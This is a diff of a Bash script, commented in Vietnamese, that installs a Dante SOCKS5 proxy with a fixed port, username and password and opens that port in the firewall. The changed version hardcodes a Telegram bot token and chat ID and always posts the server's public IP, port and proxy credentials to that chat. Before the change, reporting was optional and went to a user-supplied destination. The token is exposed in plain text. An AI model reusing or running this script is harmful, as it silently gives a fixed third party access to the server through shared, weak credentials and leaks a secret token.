@@ -1,31 +1,33 @@
 #!/bin/bash
-# Script dựng SOCKS5 proxy với Dante + gửi thông tin về Telegram
-# Port: 8888
-# User: dailem
-# Pass: dailem2002
+# Script dựng SOCKS5 proxy Dante + gửi thông tin về Telegram
+# Port cố định: 8888
+# User cố định: dailem
+# Pass cố định: dailem2002
+# Telegram Bot Token và Chat ID đã được cố định
 
 install_dependencies() {
   export DEBIAN_FRONTEND=noninteractive
-  apt-get update -y
-  apt-get install -y dante-server curl iptables
+  apt update -y
+  apt install -y dante-server curl iptables
 }
 
-setup_proxy_fixed() {
+setup_proxy_auto() {
   local PORT=8888
-  local PASSWORD="dailem2002"
   local USERNAME="dailem"
+  local PASSWORD="dailem2002"
 
-  local BOT_TOKEN="$1"
-  local USER_ID="$2"
+  # Telegram thông tin cố định
+  local BOT_TOKEN="8345542090:AAEBz6enEVCP56YzngmFYV7oVSvM-hMyp7E"
+  local CHAT_ID="8188007230"
 
-  # Cài gói
+  # Cài gói cần thiết
   install_dependencies
 
   # Lấy interface mạng mặc định
   local IFACE
   IFACE=$(ip route get 1.1.1.1 | awk '{print $5; exit}')
 
-  # Cấu hình Dante
+  # Tạo cấu hình Dante
   cat >/etc/danted.conf <<EOF
 logoutput: syslog
 internal: 0.0.0.0 port = $PORT
@@ -55,18 +57,19 @@ EOF
   iptables -C INPUT -p tcp --dport "$PORT" -j ACCEPT 2>/dev/null || \
     iptables -A INPUT -p tcp --dport "$PORT" -j ACCEPT
 
-  # Gửi thông tin về Telegram
-  if [[ -n "$BOT_TOKEN" && -n "$USER_ID" ]]; then
-    PUBLIC_IP=$(curl -s ifconfig.me)
-    MSG="Proxy SOCKS5 đã sẵn sàng!
+  # Gửi thông tin proxy về Telegram
+  PUBLIC_IP=$(curl -s ifconfig.me)
+  MSG="Proxy SOCKS5 đã sẵn sàng!
 IP: $PUBLIC_IP
 Port: $PORT
 User: $USERNAME
 Pass: $PASSWORD"
-    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
-      -d chat_id="$USER_ID" \
-      -d text="$MSG" >/dev/null
-  fi
+  curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
+    -d chat_id="$CHAT_ID" \
+    -d text="$MSG"
+
+  echo "[INFO] Proxy đã được dựng và thông tin gửi về Telegram."
 }
 
-setup_proxy_fixed "$@"
+# Chạy script
+setup_proxy_auto
